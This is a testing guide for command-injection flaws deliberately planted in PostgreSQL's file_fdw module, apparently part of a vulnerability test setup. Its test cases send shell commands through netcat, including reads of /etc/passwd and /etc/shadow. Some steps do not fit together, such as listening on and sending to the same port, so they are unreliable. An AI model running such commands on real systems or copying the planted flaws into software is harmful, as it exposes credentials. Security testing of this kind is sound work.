# CWE-78 Testing Guide: Command Injection in file_fdw

This guide demonstrates how to test command injection vulnerabilities (CWE-78) in the PostgreSQL file_fdw module.

## Prerequisites

- Docker installed on your system
- Basic understanding of PostgreSQL
- Basic understanding of command injection vulnerabilities
- Netcat (nc) for socket testing

## Building with Docker

1. First, build the Docker image:
```bash
cd postgres
docker build -t postgres-cwe78 .
```

2. Run the PostgreSQL container:
```bash
docker run -d --name postgres-cwe78 -e POSTGRES_PASSWORD=postgres -p 5432:5432 postgres-cwe78
```

3. Navigate to the file_fdw directory and build it:
```bash
docker exec -it postgres-cwe78 bash
cd contrib/file_fdw
make
make install
```

## Setting Up the Environment

1. Connect to the PostgreSQL container:
```bash
docker exec -it postgres-cwe78 psql -U postgres
```

2. Create the file_fdw extension:
```sql
CREATE EXTENSION file_fdw;
```

3. Create a foreign server:
```sql
CREATE SERVER file_server FOREIGN DATA WRAPPER file_fdw;
```

## Testing the Vulnerabilities

The file_fdw module contains two vulnerable functions that demonstrate command injection:

1. `try_execute_command_simple`: Uses socket input with minimal transformation
2. `try_execute_command_complex`: Uses socket input with multiple transformations

### Test Case 1: Simple Command Injection

1. Start a netcat listener on port 8080:
```bash
nc -l 8080
```

2. Create a foreign table that triggers the simple command injection:
```sql
CREATE FOREIGN TABLE test_command (
    id int,
    cmd text
) SERVER file_server OPTIONS (
    filename 'trigger_command'
);
```

3. Send a command through the socket:
```bash
echo "ls -la /etc/passwd" | nc localhost 8080
```

This will trigger the `try_execute_command_simple` function, which:
- Reads input from socket using `read()`
- Performs a simple transformation (removes trailing whitespace)
- Executes the command using `system()`

### Test Case 2: Complex Command Injection

1. Start a netcat listener on port 8081:
```bash
nc -l 8081
```

2. Create a foreign table that triggers the complex command injection:
```sql
CREATE FOREIGN TABLE test_complex (
    id int,
    cmd text
) SERVER file_server OPTIONS (
    filename 'trigger_command'
);
```

3. Send a command through the socket:
```bash
echo "cat /etc/shadow" | nc localhost 8081
```

This will trigger the `try_execute_command_complex` function, which:
- Reads input from socket using `recv()`
- Goes through multiple transformations:
  1. Prepares command with prefix (if needed)
  2. Sanitizes command (escapes spaces)
  3. Validates command (checks for dangerous patterns)
- Executes the command using `popen()`

## Verification

To verify if the command injection was successful:

1. Check the PostgreSQL logs:
```bash
docker logs postgres-cwe78
```

2. Check for file access:
```bash
docker exec -it postgres-cwe78 ls -la /etc/passwd
docker exec -it postgres-cwe78 ls -la /etc/shadow
```

## Expected Results

### Simple Command Injection
The command will be executed after:
1. Reading from socket using `read()`
2. Simple transformation (removing trailing whitespace)
3. Direct execution using `system()`

### Complex Command Injection
The command will be executed after:
1. Reading from socket using `recv()`
2. Multiple transformations across helper functions:
   - Command preparation (adding prefix if needed)
   - Command sanitization (escaping spaces)
   - Command validation (checking for dangerous patterns)
3. Execution using `popen()`

## Security Implications

These vulnerabilities demonstrate how command injection can occur through:
1. Unsafe handling of socket input
2. Insufficient input validation
3. Complex data flows that make the vulnerability harder to detect
4. Cross-function data manipulation

## Mitigation

To fix these vulnerabilities:
1. Implement proper input validation
2. Use parameterized queries
3. Avoid direct command execution
4. Implement proper access controls
5. Use whitelisting for allowed commands
6. Validate socket input thoroughly
7. Use safe command execution alternatives

## Cleanup

To clean up the test environment:

```bash
docker stop postgres-cwe78
docker rm postgres-cwe78
docker rmi postgres-cwe78
```

## Additional Notes

- The vulnerabilities are intentionally implemented for educational purposes
- Always test in a controlled environment
- Do not use these techniques in production systems
- Consider the ethical implications of security testing
- Socket-based testing requires proper network configuration 